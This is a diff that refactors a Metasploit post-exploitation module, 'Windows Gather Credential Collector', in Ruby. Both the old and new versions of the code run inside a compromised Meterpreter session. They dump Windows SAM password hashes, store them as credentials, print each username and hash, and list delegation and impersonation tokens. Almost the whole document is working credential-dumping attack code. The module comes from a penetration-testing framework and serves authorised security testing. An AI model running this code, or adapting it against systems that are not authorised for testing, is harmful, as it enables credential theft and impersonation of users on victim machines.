@@ -1,94 +1,117 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# ## This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Post
+  include Msf::Auxiliary::Report
 
-require 'msf/core'
-require 'rex'
-require 'msf/core/post/common'
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Credential Collector',
+        'Description' => %q{
+          This module harvests credentials found on the host and stores them in the database.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'tebo[at]attackresearch.com'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              incognito_list_tokens
+              priv_passwd_get_sam_hashes
+            ]
+          }
+        },
+        'References' => [
+          [ 'ATT&CK', Mitre::Attack::Technique::T1003_OS_CREDENTIAL_DUMPING ]
+        ]
+      )
+    )
+  end
 
+  def run
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
 
-class Metasploit3 < Msf::Post
+    # Make sure we're rockin Priv and Incognito
+    session.core.use('priv') if !session.priv
+    session.core.use('incognito') if !session.incognito
 
-	include Msf::Post::Common
-	include Msf::Auxiliary::Report
+    # It wasn't me mom! Stinko did it!
+    begin
+      hashes = client.priv.sam_hashes
+    rescue StandardError
+      fail_with(Failure::Unknown, "Error accessing hashes, did you migrate to a process that matched the target's architecture?")
+    end
 
-	def initialize(info={})
-		super( update_info( info,
-				'Name'          => 'Windows Gather Credential Collector',
-				'Description'   => %q{ This module harvests credentials found on the host and stores them in the database.},
-				'License'       => MSF_LICENSE,
-				'Author'        => [ 'tebo[at]attackresearch.com'],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
-				'SessionTypes'  => [ 'meterpreter']
-			))
+    # Target infos for the db record
+    addr = session.session_host
+    # client.framework.db.report_host(:host => addr, :state => Msf::HostState::Alive)
 
-	end
+    # Record hashes to the running db instance
+    print_good('Collecting hashes...')
 
-	# Run Method for when run command is issued
-	def run
-		print_status("Running module against #{sysinfo['Computer']}")
-		# Collect even without a database to store them.
-		if session.framework.db.active
-			db_ok = true
-		else
-			db_ok = false
-		end
+    hashes.each do |hash|
+      # Build service information
+      service_data = {
+        address: addr,
+        port: 445,
+        service_name: 'smb',
+        protocol: 'tcp'
+      }
 
-		# Make sure we're rockin Priv and Incognito
-		session.core.use("priv") if not session.priv
-		session.core.use("incognito") if not session.incognito
+      # Build credential information
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: refname,
+        private_type: :ntlm_hash,
+        private_data: hash.lanman + ':' + hash.ntlm,
+        username: hash.user_name,
+        workspace_id: myworkspace_id
+      }
 
-		# It wasn't me mom! Stinko did it!
-		hashes = client.priv.sam_hashes
+      credential_data.merge!(service_data)
+      credential_core = create_credential(credential_data)
 
-		# Target infos for the db record
-		addr = client.sock.peerhost
-		# client.framework.db.report_host(:host => addr, :state => Msf::HostState::Alive)
+      # Assemble the options hash for creating the Metasploit::Credential::Login object
+      login_data = {
+        core: credential_core,
+        status: Metasploit::Model::Login::Status::UNTRIED,
+        workspace_id: myworkspace_id
+      }
 
-		# Record hashes to the running db instance
-		print_good "Collecting hashes..."
+      login_data.merge!(service_data)
+      create_credential_login(login_data)
 
-		hashes.each do |hash|
-			data = {}
-			data[:host]  = addr
-			data[:port]  = 445
-			data[:sname] = 'smb'
-			data[:user]  = hash.user_name
-			data[:pass]  = hash.lanman + ":" + hash.ntlm
-			data[:type]  = "smb_hash"
-			if not session.db_record.nil?
-				data[:source_id] = session.db_record.id
-			end
-			data[:source_type] = "exploit",
-			data[:active] = true
+      print_line "    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}"
+    end
 
-			print_line "    Extracted: #{data[:user]}:#{data[:pass]}"
-			report_auth_info(data) if db_ok
-		end
+    # Record user tokens
+    tokens = session.incognito.incognito_list_tokens(0)
+    raise Rex::Script::Completed if !tokens
 
-		# Record user tokens
-		tokens = session.incognito.incognito_list_tokens(0)
-		raise Rex::Script::Completed if not tokens
+    # Meh, tokens come to us as a formatted string
+    print_good 'Collecting tokens...'
+    (tokens['delegation'] + tokens['impersonation']).split("\n").each do |token|
+      data = {}
+      data[:host] = addr
+      data[:type] = 'smb_token'
+      data[:data] = token
+      data[:update] = :unique_data
 
-		# Meh, tokens come to us as a formatted string
-		print_good "Collecting tokens..."
-		(tokens["delegation"] + tokens["impersonation"]).split("\n").each do |token|
-			data = {}
-			data[:host]      = addr
-			data[:type]      = 'smb_token'
-			data[:data]      = token
-			data[:update]    = :unique_data
+      print_line "    #{data[:data]}"
 
-			print_line "    #{data[:data]}"
-			report_note(data) if db_ok
-		end
-	end
+      report_note(data)
+    end
+  end
 end
